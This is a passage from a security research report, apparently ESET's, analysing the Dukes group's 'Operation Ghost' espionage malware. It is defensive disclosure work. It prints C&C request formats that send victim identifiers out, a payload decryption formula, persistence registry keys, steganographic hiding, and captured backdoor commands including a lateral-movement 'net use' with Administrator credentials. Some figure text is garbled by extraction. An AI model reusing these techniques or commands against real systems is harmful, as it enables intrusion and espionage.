we were not able to identify other targets.One of the first traces of this campaign is to be found on Reddit in July 2014. Figure 4 shows a message posted by one of the Dukes’ operators. The strange string using an unusual charset is the encoded URL of a C&C server and is used by PolyglotDuke as described in section 4 2.9Figure 4 // Reddit post containing an encoded C&C URLFigure 5 presents the timeline of Operation Ghost. As it is based on ESET telemetry, it might be only a partial view of a broader campaign.(cid:31)(cid:30)(cid:29)(cid:26) SeptemberN E W(cid:31)(cid:30)(cid:29)(cid:25) July(cid:31)(cid:30)(cid:29)6 SeptemberN E WFirst known compilation timestamp of PolyglotDukePost on Reddit containing an encoded C&C URLFirst known deployment in the wild of a FatDuke sample(cid:31)(cid:30)(cid:29)(cid:27) OctoberPublication of this report(cid:31)(cid:30)(cid:29)(cid:27) June(cid:31)(cid:30)(cid:29)8 OctoberLatest known FatDuke sample deployed in the wildLast Twitter account registered by the DukesFigure 5 // Timeline of Operation Ghost(cid:31)(cid:30)(cid:29)(cid:23) AugustN E WFirst known deployment in the wild of a RegDuke sample3.2 Attribution to the DukesIt is important to note that when we describe so-called “APT groups”, we’re making connections based on technical indicators such as code similarities, shared C&C infrastructure, malware execution chains, and so on We’re typically not directly involved in the investigations and identification of the individuals writing the malware and/or deploying it, and the interpersonal relationships between them Furthermore, the term “APT group” is very loosely defined, and often used merely to cluster the abovementioned malware indicators This is also one of the reasons why we refrain from speculation with regard to attributing attacks to nation states and suchOn one hand, we noticed numerous similarities in the tactics of this campaign in comparison to previously documented ones:• Use of Twitter (and other social websites such as Reddit) to host C&C URLs. • Use of steganography in pictures to hide payloads or C&C communications. • Use of Windows Management Instrumentation (WMI) for persistence.10We also noticed important similarities in the targeting:• All the known targets are Ministries of Foreign Affairs. • Two of the three known targeted organizations were previously compromised by other Dukes malwaresuch as CozyDuke, OnionDuke or MiniDuke.• On some machines compromised with PolyglotDuke and MiniDuke, we noticed that CozyDukewas installed only a few months before.However, an attribution based only on the presence of known Dukes tools on the same machines should be taken with a grain of salt. We also found two other APT threat actors – Turla [19] and Sednit [20] – on some of the same computers.On the other hand, we were able to find strong code similarities between already documented samples and samples from Operation Ghost. We cannot discount the possibility of a false flag operation; however, this campaign started while only a small portion of the Dukes’ arsenal was known. In 2013, at the first known compilation date of PolyglotDuke, only MiniDuke had been documented and threat analysts were not yet aware of the importance of this threat actor. Thus, we believe Operation Ghost was run simultaneously with the other campaigns and has flown under the radar until now.PolyglotDuke (SHA-1: D09C4E7B641F8CB7CC86190FD9A778C6955FEA28), documented in detail in section 4 2 uses a custom encryption algorithm to decrypt the strings used by the malware. We found functionally equivalent code in an OnionDuke sample (SHA-1: A75995F94854DEA8799650A2F4A97980B71199D2) that was documented by F-Secure in 2014 [16]. It is interesting to note that the value used to seed the srand function is the compilation timestamp of the executable. For instance, 0x5289f207 corresponds to Mon 18 Nov 2013 10:55:03 UTC.The IDA screenshots in Figure 6 show the two similar functions.PolyglotDukeOnionDukeFigure 6 // Comparison of a custom string encryption function found in PolyglotDukeand in OnionDuke samples from 2013Similarly, the recent samples of the MiniDuke backdoor bear similarities with samples documented more than five years ago. Figure 7 is the comparison of a function in a MiniDuke backdoor listed by Kaspersky in 2014 [21] (SHA-1: 86EC70C27E5346700714DBAE2F10E168A08210E4) and a MiniDuke backdoor (SHA-1: B05CABA461000C6EBD8B237F318577E9BCCD6047) compiled in August 2018.11MiniDuke from 2014MiniDuke from 2018Figure 7 // Comparison of the same function in MiniDuke from 2014 and in MiniDuke from 2018Given the numerous similarities between other known Dukes campaigns and Operation Ghost, especially the strong code similarities, and the overlap in time with previous campaigns, we assess with high confidence that this operation is run by the Dukes.3.3 Tactics and tools In Operation Ghost, the Dukes have used a limited number of tools, but they have relied on numerous interesting tactics to avoid detection.First, they are very persistent. They steal credentials and use them systematically to move laterally on the network. We have seen them using administrative credentials to compromise or re-compromise machines on the same local network. Thus, when responding to a Dukes compromise, it is important to make sure to remove every implant in a short period of time. Otherwise, the attackers will use any remaining implant to compromise the cleaned systems again.Second, they have a sophisticated malware platform divided in four stages:• PolyglotDuke, which uses Twitter or other websites such as Reddit and Imgur to get its C&C URL.It also relies on steganography in pictures for its C&C communication.• RegDuke, a recovery first stage, which uses Dropbox as its C&C server. The main payload is encryptedon disk and the encryption key is stored in the Windows registry. It also relies on steganography as above.• MiniDuke backdoor, the second stage. This simple backdoor is written in assembly. It is very similarto older MiniDuke backdoors.• FatDuke, the third stage. This sophisticated backdoor implements a lot of functionalities and has a veryflexible configuration. Its code is also well obfuscated using many opaque predicates. They re-compile it and modify the obfuscation frequently to bypass security product detections.Figure 8 is a summary of the malware platform of Operation Ghost. During our investigation, we also found a previously unknown (and apparently now retired) third-stage backdoor, LiteDuke, that was used back in 2015. For the sake of historical completeness, it is analyzed in section 4 6.12InitialCompromiseStage (cid:127)Stage (cid:129)Stage (cid:141)Hypothesis(cid:12)(cid:7)Malicious documentsent by emailStolen credentials & lateral movementFetchthe C&C URLPolyglotDukeRegDukeOnline ServiceDownloads a picture from the C&C serverDownloads a picturefrom the Dropbox accountDecrypt and dropDecode, decryptand dropMiniDukeDownloads a picture from the C&C serverDecrypt and dropFatDukeFigure 8 // Summary of Operation Ghost malware platformThird, we also noticed that the operators avoid using the same C&C network infrastructure between different victim organizations. This kind of compartmentalization is generally only seen by the most meticulous attackers. It prevents the entire operation from being burned when a single victim discovers the infection and shares the related network IoCs with the security community.3.4 Operational times When it comes to cyberespionage, it is not uncommon for the malware developers and operators to follow the standard working hours of the country where they are located. For instance, we previously showed that Sednit operators were generally working from 9 AM to 5PM in the UTC+3 time zone [20]. Previously, FireEye researchers noticed that the Dukes were also mainly operating in the UTC+3 time zone [12].For Operation Ghost, we compiled three different types of timestamp in order to have an idea of their operational times:• The time at which they uploaded C&C pictures to the Dropbox account used by RegDuke • The time at which they posted encoded C&C URLs on the social media accounts used by PolyglotDuke • The compilation timestamps of dozens of samples. We believe they were not tampered with,as they are consistent with what we see in ESET telemetry data.It should be noted that some of these timestamps may have been generated by an automated command system or an automated build system.13Figure 9 shows the distribution of the operational hours of the Dukes in the three different time zones. The distribution aligns well with working hours in a UTC+2 or UTC+3 time zone, with occasional work during the night. This might be explained by a need to work at the same time as some of their victims.Numberof timestamps(cid:26)(cid:28)(cid:27)(cid:30)(cid:29)(cid:28)(cid:31)(cid:30)(cid:28)Operational HoursUTC +(cid:9) timezoneUTC timezoneHourUTC +(cid:8) timezone(cid:28)(cid:25)(cid:27)(cid:26)(cid:24)(cid:31)(cid:28)(cid:31)(cid:25)(cid:31)(cid:27)(cid:31)(cid:26)(cid:31)(cid:24)(cid:25)(cid:28)(cid:25)(cid:25)Figure 9 // Dukes operational hours4. TECHNICAL ANALYSIS In this part, we present the technical analyses of the different malware stages used in Operation Ghost4.1 Compromise vector Despite having analyzed the Dukes activities in several different organizations, we were not able to find the initial compromise vector. The group is known for sending well-crafted malicious emails, but we did not find any such samples.It should also be noted that two of the three targeted organizations we identified had previously been compromised by the Dukes, mainly in 2015. As such, it is highly possible that the attackers kept control over the compromised networks during this whole period. We observed them pivoting in an already-compromised network using lateral movement tools like PsExec and stolen administrative credentials. As such, from only a few compromised machines, they are able to expand their operations.4.2 PolyglotDuke: the first stage PolyglotDuke is a downloader that is used to download and drop the MiniDuke backdoor. As mentioned in section 3 2 and shown in Figure 6, this downloader shares several similarities with other samples from previous Dukes campaigns such as the use of Twitter to retrieve and decode its C&C server address, as well as a custom string encryption implementation. Both 32- and 64-bit versions of PolyglotDuke were observed and have similar behavior. We dubbed this downloader PolyglotDuke in reference to its use of charsets from different languages to encode the C&C addresses.14Dropper PolyglotDuke’s dropper embeds an encrypted PolyglotDuke within a resource type named GIF with the ID 129. The resource is encrypted with the following algorithm, using the string GIF89 from the resource (which is the 5 first magic bytes of the start of the GIF header) as the key:clearText[i] = (i / 5) ^ cypherText[i] ^ aGif89[i % 5] After decryption, the DLL is written to the current working directory and executed using rundll32.exe. The custom string encryption algorithm used by the PolyglotDuke dropper is identical to the one used by PolyglotDuke, as well as other samples from previous Dukes campaigns, and is depicted in Figure 7.As mentioned in section 3 2, it’s worth noting that this dropper shares a great deal of functionality with OnionDuke, such as the use of a GIF resource, the use of the same algorithm with the string GIF89 as key to decrypt the resource, and the use of the same custom encryption algorithm to encrypt the strings.C&C server address retrieval from public webpages Strings from PolyglotDuke are decrypted using two different algorithms. The string is either RC4 encrypted using the CryptDecrypt API where the key is derived from the system directory path with the drive letter removed, or using the custom encryption algorithm shown in Figure 6. An IDA Python script to decrypt these strings is provided in our GitHub repository.The C&C server address is retrieved and decoded from various public webpages such as Imgur, ImgBB or Fotolog posts, tweets, Reddit comments, Evernote public notes, etc. Several encrypted public webpage URLs are hardcoded in each sample (from three to six URLs in a single sample) and it will iterate over the hardcod- ed list of C&C server addresses until it is able to decode a valid C&C URL successfully. An example of a public webpage containing an encoded C&C URL is shown Figure 10.Figure 10 // Example of a public post containing an encoded C&C URLAfter retrieving the content of one of these webpages, PolyglotDuke parses it to find two delimiter strings and extracts the content between them. The extracted UTF-8 string uses a particular character set within a Unicode block such as Katakana [22], Cherokee [23] or Kangxi radicals [24]. Any given sample can only decode a C&C URL encoded in one of those charsets. The string is first converted to UTF-16, only the last byte of each codepoint is kept, then a custom mapping is used to transpose this to printable ASCII. The order of the characters of the resulting string is then reversed, resulting in the C&C URL. A script to decrypt the C&C URL, regardless of the Unicode range used, is provided on our GitHub repository.15PolyglotDuke, a multilingual downloaderKatakana is a Japanese syllabary (part of the Japanese writing system), while Cherokee syllabary is used to write Cherokee (which is a Haudenosaunee language), and Kangxi radicals are components of Chinese characters. The use of these character sets from different languages is the reason we named this downloader PolyglotDuke: ⿔⿕Interestingly, the text from the delimiter strings usually makes sense in the context of the fake post. The decoded C&C URL points to a PHP script with which the downloader communicates using GET requests, as described in the next section.Communication with the C&C server Once the C&C server URL is decoded, the compromised computer sends HTTP GET requests with arguments using the following format:GET example.com/name. php?[random_param1]=[random_string1]&[random_param2]=[random_string2] Only the argument values are relevant here as the argument names are selected randomly from a hardcod- ed list. The list of argument names used is shown in Table 1. This makes the communication between PolyglotDuke and the C&C server difficult to identify because there are no obvious patterns. Additionally, the User-Agent header used to perform the GET requests is a common one:Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)Table 1List of parameters used to generate GET request to the C&C serverList of hardcoded argument namesaction v16The GET argument values are randomly generated but the first random string in each request should comply with a constraint based on a specific integer (see below). A string will be randomly regenerated until one complies with the constraints. The digits from the string representation of the MD5 hash of the randomly generated string are summed, and then modulo 5 of this value must match a specific integer.The communication with the C&C server to retrieve a payload follows this sequence:•• First the communication with the C&C server is checked. The sum of the digits of the MD5 hash of the first argument modulo 5 should be equal to 4. The response of the C&C server is matched with the second random string as it will echo back this string in case of successful communication. If the communication with the C&C server is successful, a custom hash from the concatenation of the username and the volume serial number of the disk of the current directory is generated and sent twice. The modulo 5 value of the MD5 hash of the first parameters of these requests should be 0 and 2 respectively. In the response to the second request, search for <img src=” and the next “> strings in the last response and extract the image filename between them, if present. Figure 11 shows a C&C server response at the identification step, with a path to an image (cuteanimals12.jpg in this case). If a filename was extracted in the preceding step, the file is retrieved into the directory whose name is the unique ID sent twice at the registration step: GET example.com/<Username_VolumeID_Hash>/cuteanimals12.jpg••Figure 11 // C&C response with a path to an image to downloadThis sequence continues until a path to a file is provided between the <img src=” and “> strings and the file downloaded. The communication steps are summarized in Figure 12.PolyglotDukeTwitter, ImgurRedditC&C serverRetrieve C&C addressCommunication checkIdentiﬁcationGet imgEchoPath to ﬁleImgTimeFigure 12 // Communication sequence with the C&C server17Interestingly, the root URLs of the C&C server used by PolyglotDuke redirect to domains with similar names hosting legitimate websites. This technique is probably used in order to avoid suspicion when investigating the traffic with the C&C server. For one of the C&C servers, the attackers forgot to add a TLD to the redirect- ed domain. Examples of redirection are shown in Table 2.Table 2Example of redirection from the C&C servers’ root URLsC&C server domain name rulourialuminiu.co[.]uk powerpolymerindustry[.]com ceycarb[.]comRedirection target ceycarb (invalid, missing TLD)Payload decryption and execution A data blob containing encrypted data is appended to the end the downloaded file: this technique allows data to be easily included in a JPEG or PNG image download in a way that means the image remains valid. We couldn’t retrieve any of the files downloaded by PolyglotDuke to confirm this hypothesis but the way the encrypted blob is added to such files in addition to their extension being .jpg or .png lead us to think that they were valid images used to look like legitimate traffic.To extract the payload from the file downloaded from the C&C server, PolyglotDuke will first decrypt the last eight bytes with RC4 using the same key as the one used for strings decryption. The first four decrypted bytes correspond the offset to the embedded blob relative to the end of the file and the last four bytes provide a value used as integrity check; that value is the same as the first four bytes at the beginning of the blob.The structure of the file is described in Figure 13.DWORDDWORDDWORDSize(cid:27)x(cid:25)(cid:27)(cid:27)DWORDIMGIMG(cid:28)x(cid:26)BD(cid:23)(cid:22)(cid:28)(cid:26)(cid:28)sizeRC(cid:12) encrypted PESignatureO(cid:20)setRC(cid:12)encryptedo(cid:20)setRC(cid:12)encrypted (cid:28)x(cid:26)BD(cid:23)(cid:22)(cid:28)(cid:26)(cid:28)Figure 13 // Embedded blob formatAfter obtaining the offset to the embedded blob and checking the integrity value, the size of the RC4-en- crypted blob is retrieved from immediately afterward. Then, next to the encrypted blob, we find the signed SHA-1 hash of the blob. Before decrypting the blob, the hash signature is checked against an RC4-encoded public key hardcoded in the binary. The signature verification procedure is shown in Figure 14 , while the public key used to check the hash signature is shown in Figure 15.18Figure 14 // Decompiled hash signature verification procedureFigure 15 // Public key used to verify the hash signatureThis technique ensures that only a payload signed by the operators could be executed on the victim’s machine, since the private key used to sign the hash is needed to generate a valid signature.After having successfully checked the hash signature of the encrypted blob, it is decrypted using the same key used for the RC4-encrypted strings. The format of the decrypted blob is shown in Figure 16.DWORDPE SizeDWORDFilename size(cid:31)x(cid:29)BD(cid:26)(cid:25)(cid:31)(cid:29)(cid:31)(cid:29)Exec type(cid:29) (cid:11)(cid:31)x(cid:29)BD(cid:26)(cid:25)(cid:31)(cid:29)(cid:31)PE SizePE(cid:31)x(cid:29)BD(cid:26)(cid:25)(cid:31)(cid:29)(cid:31) FilenamesizeFilenameFigure 16 // Encrypted blob format after decryptionNotice that the same delimiter value is used and checked at various positions of the blob (in the example in Figure 16 it is 0x1BD75010). Two of the bytes between the first two delimiters define the action to be taken with the decrypted blob.The value immediately following the second delimiter is the size of the data, being either a PE or an encrypted configuration, followed by the data itself followed by a third delimiter, the size of the subsequent filename, and finally the filename itself. The correct extension (.dll or .exe) will be appended to the filename of the PE to be written, depending on the executable type. The list of valid combinations and their respective behaviors is shown on Table 3.19Table 3List of execution type combination and their corresponding behaviorexec type 1exec type 20 write the executable to disk and launch it using CreateProcess write the DLL to disk and launch it using rundll32.exe write the DLL to disk and load it using LoadLibraryW write the encrypted JSON config to the registry, updating the list of public pages to parse for encoded C&C addresses4.3 RegDuke: a first-stage implant RegDuke is a first-stage implant that is apparently used only when attackers lose control of the other implants on the same machine. Its purpose is to stay undetected as long as possible to help make sure the operators never lose complete control of any compromised machine.It is composed of a loader and a payload, the latter being stored encrypted on the disk. Both components are written in .NET. RegDuke persists by using a WMI consumer named MicrosoftOfficeUpdates. It is launched every time a process named WINWORD.EXE is started. Our analysis is based on the sample with SHA-1 0A5A7DD4AD0F2E50F3577F8D43A4C55DDC1D80CF.The loader Between August 2017 and June 2019, we have seen four different main versions of the loader. The first version was not obfuscated and had the encryption key hardcoded in the code. Later versions read the encryption key from the Windows registry and use different types of obfuscation such as control-flow flattening or directly using NET Reactor, a commercial obfuscator. Figure 17 is a sample of RegDuke obfuscated with .NET Reactor.Figure 17 // Obfuscated RegDuke sampleThe flow of the loader is simple. It reads the encrypted file at either a hardcoded path or at a value extracted from the Windows registry, as shown in Figure 18.Figure 18 // RegDuke. The path, password and salt are hardcoded in this example.20Then, it decrypts it using a password and a salt either hardcoded in the loader or stored in the Windows registry. The encryption key and the initialization vector are derived from the password and the salt using the technique described in RFC 2898, also known as PBKDF2, as shown in Figure 19.Figure 19 // Decryption of RegDuke payloadIn all the samples we have seen, they use only the three different registry keys listed in Table 4. It is interesting to note that attackers seem to have put some effort at selecting registry keys and values that might look legitimate.Table 4RegDuke Windows registry keysRegistry KeyValue containing the directory of the payloadValue containing the filename of the payloadValue containing the password and the saltHKEY_LOCAL_MACHINE\SOFTWARE\Intel\ MediaSDK\Dispatch\0102 HKEY_LOCAL_MACHINE\SOFTWARE\Intel\ MediaSDK\Dispatch\hw64-s1-1 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ MSBuild\4.0PathCPACPAmoduleRootPathAPIModuleInitStackMSBuildOverride- TasksPathDefaultLibsBinaryCacheFinally, the decrypted Windows Executable is loaded using the Assembly.Load method. We only found one payload, but we cannot be certain that others are not deployed in the wild.The payload: a fileless, Dropbox-controlled backdoor The payload is a backdoor that resides in memory only, and that uses Dropbox as its C&C server. Its configuration is hardcoded in an internal class, shown in Figure 20. Our analysis is based on the sample with SHA-1 5905C55189C683BC37258AEC28E916C41948CD1C.Figure 20 // Dropbox backdoor configuration (redacted)We have seen the following clientId values being used: collection_3, collection_4, collection_6, collection_7, collection_8 and collection_99. However, other than collection_4, we were not able to determine the targets for these collections.21The backdoor regularly lists the Dropbox directory corresponding to its clientId and downloads PNG files from it. The downloaded PNG files are valid pictures, as you can see in Figure 21.Figure 21 // Example of two pictures downloaded from the Dropbox directoryHowever, the attackers have used steganography to hide data in the pictures. In Figure 22, you can see the code looping over all the pixels of the image and extracting data from them.Figure 22 // Loop extracting a payload from the pixels of a downloaded pictureEach pixel is encoded into 24 bits: 8 for red, 8 for green and 8 for blue. The developers use a technique called “Least Significant Bit” to store 8 bits of data in each pixel, as shown in Figure 23. This technique has been used previously by other malware such as Gozi [25]. They extract two bits from the red value, three from the green and three from the blue.RedGreenBlue(cid:31)(cid:30)(cid:31)(cid:30)(cid:31)(cid:30)(cid:30)(cid:31)(cid:30)(cid:30)(cid:30)(cid:30)(cid:31)(cid:31)(cid:30)(cid:31)(cid:31)(cid:30)(cid:30)(cid:30)(cid:31)(cid:31)(cid:31)(cid:30)(cid:30)(cid:31)(cid:31)(cid:30)(cid:31)(cid:31)(cid:31)(cid:30)Figure 23 // The least significant bits of each color of each pixel are extracted to recover the hidden data22The steganographically altered image has almost no visible difference from the original image because the two or three least significant bits have a very limited impact on the color. For the green and blue components of each pixel a maximum of 7/256, and for the red component 3/256 of a fully saturated pixel variation will occur. Figure 24 shows a blue of value 255 (on the left) and the maximum deviation from that in just the blue spectrum with a value of 248 (on the right). There is apparently no difference but, by doing that on every pixel of the image, allows the attacker to store a backdoor in a still valid PNG image.255248Figure 24 // Comparison between a blue of value 255 and a blue of value 248Finally, it decrypts the extracted bytes using the AES key hardcoded in the config. The decrypted data can be:• a Windows executable • a Windows DLL • a PowerShell scriptWe have seen the following executables being dropped by this Dropbox backdoor:• Several MiniDuke backdoors (see section 4 4) • Process Explorer, a utility that is part of the SysInternals suite4.4 MiniDuke backdoor: the second stage As highlighted in section 3 2, the most recent versions of the MiniDuke backdoor have a lot of code similarities with earlier versions, such as the sample with SHA-1 of 86EC70C27E5346700714DBAE2F10E168A08210E4, described by Kaspersky researchers in 2014 [21]. Our analysis is based on the sample with SHA-1 B05CABA461000C6EBD8B237F318577E9BCCD6047, compiled on August 17, 2018. MiniDuke acts as a second-stage backdoor, which is dropped by one of the two first-stage components described in the sections above.The most recent samples we are aware of were compiled in June 2019 and show no major changes, except the C&C domain and the use of an invalid (likely transplanted) digital signature, as shown in Figure 25. This might be an attempt to bypass some security products.Figure 25 // Invalid digital signature added to the backdoor23The backdoor is still written in pure x86 assembly but its size increased a lot – from 20 KB to 200+ KB. This is due to the addition of obfuscation, mainly control-flow flattening [26], as shown in Figure 26. This is a common obfuscation technique that makes it difficult to read the code because every function is split in a switch/case inside a loop.Figure 26 // Control flow flattening used to obfuscate the MiniDuke backdoorSome of the Windows API functions are resolved dynamically. The backdoor uses a simple hash function to obfuscate the name of the function it tries to resolve.The network communication is relatively simple. It can use the GET, POST and PUT HTTP methods to contact the hardcoded C&C server.In order to blend into the legitimate traffic, the data are prepended with a JPEG header. The resulting images are not valid, but it is very unlikely that anybody will check the validity of all pictures in the network traffic. Figure 27 is an example of a POST request to the C&C server. As the server was down at the time of capture, we were not able to receive a reply, but we believe the reply also contains a JPEG header, as the malware ignores the first bytes of the reply.Figure 27 // Post request to the C&C server that looks like a regular jpeg file uploadIn addition to the HTTP protocol, the malware is able to send and receive data over a named pipe. This feature typically allows it to reach machines on the local network that don’t have internet access. One compromised machine, with internet access, will forward commands to other compromised machines through the named pipe.A similar feature to the named pipe is the HTTP proxy. The malware will listen on a first socket, either on the default port 8080 or on a port specified by the operators. It will also open a second socket with the C&C server. It waits for connections on the first socket and when one is established, it proxies data between the two sockets. Thus, a machine without internet access, or with a firewall that blocks connec- tions to the attackers’ domain, might still be able to reach the C&C through the proxy machine.24Finally, this malware implements thirty-eight different backdoor functions such as:• Uploading or downloading files • Creating processes • Getting system information (hostname, ID, pipename, HTTP method) • Getting the list of local drives and their type (unk, nrt, rmv, fix, net, cdr, ram, und) • Reading and writing in the named pipe • Starting and stopping the proxy feature4.5 FatDuke: the third stage FatDuke is the current flagship backdoor of the group and is only deployed on the most interesting machines. It is generally dropped by the MiniDuke backdoor, but we also have seen the operators dropping FatDuke using lateral movement tools such as PsExec.The operators regularly repack this malware in order to evade detections. The most recent sample of FatDuke we have seen was compiled on May 24, 2019.We have seen them trying to regain control of a machine multiple times in a few days, each time with a different sample. Their packer, described in a later section, adds a lot of code, leading to large binaries. While the effective code should not be larger than 1MB, we have seen one sample weighing in at 13MB, hence our name for this backdoor component: FatDuke.In this section, we will use the sample with SHA-1 DB19171B239EF6DE8E83B2926EADC652E74A5AFA for our analysis.Installation and persistence During our investigation, we were not able to find a dropper for FatDuke. We believe the operators simply install the backdoor and establish persistence using the standard commands of an earlier stage backdoor.We also noted that FatDuke generally replaced the second-stage binary, reusing the persistence mechanism already in place.The persistence we have seen is very standard. They use the registry key HKLM\SOFTWARE\Microsoft\ Windows\CurrentVersion\Run and creatd a new value named Canon Gear and value C:\Program Files\Canon\Network ScanGear\Canocpc.exe. This launches the backdoor each time a user logs in.Configuration FatDuke has a hardcoded configuration embedded in the executable’s resources, as shown in Figure 28.Figure 28 // FatDuke configuration data in the PE resources25The configuration data is a JSON object encoded in base64. Once decoded, it reveals much interesting information, as shown in Figure 29.{ ""pivoting_ip"":	""<redacted	local	IP	v4	address>"", ""server_address"":	""url"", ""connection_types"":	""WinInet,WinHttp,UrlMon"", }""cookies"":	""param,location,id_cookie,info,session_id"", ""activity_scheduler"":	""Mon,Tue,Wed,Thu,Fri;0:00-23:59"", ""grab_ua_by_probing"": ""0""""request_min_timeout_s"":	""1"", ""request_max_timeout_s"":	""60"", ""php_aliases"":	""about.php,list.php,contacts.php,people.php,forum.php,index.php,Figure 29 // FatDuke configuration exampleIncluded in the information contained in the config, we can see:• The AES key used to encrypt/decrypt the network traffic • The pipe name and the credentials used to contact another machine on the local network • The C&C URL • The time of day when the backdoor is enabled for attacker access • Cookies that the malware can fetch in the browser’s cookie directory. They are related to cookies usedby Google services such as YouTube or GmailThe operator has the possibility to fetch the configuration from the computer along with usual computer information like username, Windows version, computer name, build, etc.Finally, it does not seem possible to update this configuration without dropping a new version of the malware.Backdoor and network FatDuke can be controlled remotely by the attackers using a custom C&C protocol over HTTP or using named pipes on the local network. HTTP communications and backdoor commandsIn order to blend into the network traffic, FatDuke tries to mimic the user’s traffic by using the same User-Agent as the browser installed on the system. It implements two different techniques to gather this value.26First, it can probe the User-Agent by making an HTTP request on a socket it has just created.1. It creates a socket listening on localhost:80 2. It accepts any connection 3. It calls ShellExecuteW with open and url as argument. This will open the defaultbrowser on the URL localhost.4. The socket replies with a hardcoded HTTP reply:HTTP/1.1 200 OK Server: Apache/2.2.14 (Win32) Content-Type: text/html Connection: close <html><script>window.close();</script></html> This simple JavaScript code will directly close the browser. The window pops up only for a fraction of second but the user also loses focus of the currently active window.5. In order to extract the User-Agent, FatDuke parses the HTTP request sent by the browser to its socket. If the previous method did not work, it can check the default browser in the registry key HKCU\Software\ Classes\http\shell\open\command. It then selects one of the hardcoded User-Agent strings accordingly, as shown in Table 5.Table 5Hardcoded User-AgentDefault BrowserChromeSelected User-Agent Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0Firefox Internet Explorer Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)OperaSafariMozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.35 Safari/537.36 OPR/24.0.1558.21 Mozilla/5.0 (Windows; Windows NT 6.1) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2Next, FatDuke contacts the C&C server, specified in the config, and uses one of the PHP scripts specified in the php_aliases field of the config. It is interesting to note that these filenames are related to the theme of the C&C server domain. For example, they registered the domain westmedicalgroup[.]net, and the aliases list contains filenames such as doctors.php or diagnostics.php. Figure 30 is a summary of the C&C protocol.FatDukeGET Request to the C&C</>HTML pageUse a regexto extract a speciﬁcimage URLImage URLDownloadsthe PNG image>_MaliciousactionExecutethe command{ JSON }Decodeand decryptBackdoorcommand in JSONImage URLFigure 30 // FatDuke C&C protocol27The requests sent to the C&C server are crafted to look like typical GET requests and once again are related to the script name. For example, the request below uses parameters that you might expect to find on a forum’s website./homepage/forum.php?newsid=<RANDOM>&article=<REDACTED>&user= However, while some fields are randomly generated strings, article and user could be used by the operator to pinpoint the victim. The first keyword, article, is an identifier – a SHA-256 hash of the volume identifier concatenated with MAC addresses found on the target computer. The other keyword, user, probably flags the general configuration that comes with the malware. This value is located in the PE resource section, right before the encoded configuration mentioned in section 4 5.The reply is an HTML page, with the HTML content copied from a legitimate website such as the BBC. However, if the C&C server wants to send a command to the malware, it will add an additional HTML img tag to the page, as shown in Figure 31.Figure 31 // Additional image tag sent by FatDuke C&COnce it receives this HTML page, the malware uses the two following regexes:• <img id=”id[0-9]+” src=”([^ “]+)” class=”image-replace”[^>]*> • <img id=”idd[0-9]+” src=”([^ “]+)” class=”image-replace”[^>]*> These regexes extract the src attribute value – the URI of the image. If it finds an image, the malware will make another GET request to http(s)://<C&C>/<directory>/<php_script.php>?imageid=<src value>. In our example, it will make a request to url This will return a file, such as that shown in Figure 32. These files masquerade as PNG images in the GET request, but are not valid images. They contain a header of 0x37 bytes, matching one hardcoded in the malware, and a chunk of encrypted data that is base64 encoded. To further the PNG subterfuge, the header contains an incomplete, misplaced and corrupted PNG header, which may be sufficient to avert concern under cursory examination.Figure 32 // C&C response including most of a valid PNG header and an encrypted command for FatDuke28The malware then decrypts this data using AES-256 in ECB mode, with the key hardcoded in the config. The result is a command in JSON. Figure 33 shows six real command examples.{""commandBody"":""14 C:\\Users\\<redacted>\\AppData\\ Local"",""size"":0,""iscmd"":true} {""commandBody"":""5 -parsing=raw -type=exe net. exe use \\\\WORKPC\\IPC$ \\""<redacted password>\\"" / USER:Administrator"",""size"":0,""iscmd"":true} {""commandBody"":""5 -parsing=raw -type=exe schtasks.exe /Query /FO TABLE"",""size"":0,""iscmd"":true} {""commandBody"":""14	C:\\Users\\Administrator"",""size"":0,""iscmd"":true} {""commandBody"":""14 \\\\<redacted>\\C$\\Users\\User\\ Desktop"",""size"":0,""iscmd"":true} {""commandBody"":""7"",""size"":0,""iscmd"":true}Figure 33 // Example of commands sent to FatDukeThese JSON objects contain a command identifier and the command arguments. Table 6 shows the commands implemented by FatDuke.Table 6FatDuke backdoor commandsID Read or write an environment variable Load a DLL Unload a DLL Execute rundll32 Execute a command, a wscript, a PowerShell command or create a process Execute a command, a wscript, a PowerShell command or create a process, using a pipe to get the result Kill a process Kill itself Uninstall (secure delete its DLL and exit the process) Turn on or off the random interval Set User-Agent to default valueEnable debug logReturn the working directory Change the working directory Move a file or a directoryID Copy a file or a directory Remove a directory Remove a file Compute the MD5 of a filecat a fileExfiltrate a fileWrite a file Write random data to a file (secure deletion)System informationDate List running processes Return the list of disks with their type and available space Return malware information Listen to a pipe Stop listening to a pipe List open pipesThe C&C servers used for FatDuke do not seem to be compromised websites. In order to look legitimate, they register variants of existing domains and redirect the homepage of their C&C server to the homepage of the real domain. As mentioned before, this technique is also used for PolyglotDuke C&C servers.For example, they registered the domain fairfieldsch[.]org and make it redirect to fairfields.northants.sch.uk, the website of a school in the UK. We also noticed that they used several C&C servers per targeted organization, but these servers apparently don’t overlap across the victims, ensuring tight compartmentalization.29Local network pivotingWhat if the compromised machine doesn’t have access, or has restricted access, to the Internet? The developers implemented a functionality they called PivotingPipeTransport. It allows the malware to communicate with other malware instances using pipes. In order to connect to a remote machine, it first calls WNetAddConnection2. This function takes the following arguments:• lpNetResource: the remote machine • lpPassword: the remote password • lpUserName: the remote username These pieces of information are available in the malware configuration under the names:• pivoting_ip Then, it will create a pipe using the name specified in the pivoting_pipe configuration field and use it to communicate with the other malware instance.Thus, this functionality allows attackers to bypass network restrictions that may be enforced on critical systems. However, they need to steal the credentials of the remote machine first or use organization-level administrative credentials.Obfuscation The FatDuke binaries are highly obfuscated. They use three different techniques in order to slow down analysis.First, they use string stacking for all important strings; this consists of building strings dynamically by pushing each character separately on the stack, rather than using strings from the .data section. They also add some basic operations to the stacking in order to prevent the extraction without emulating the code. Figure 34 shows such an example where the ASCII value of each letter is multiplied with a hardcoded value of 1.Figure 34 // FatDuke obfuscation – String stackingSecond, they also add opaque predicates in most of the functions. Opaque predicates are 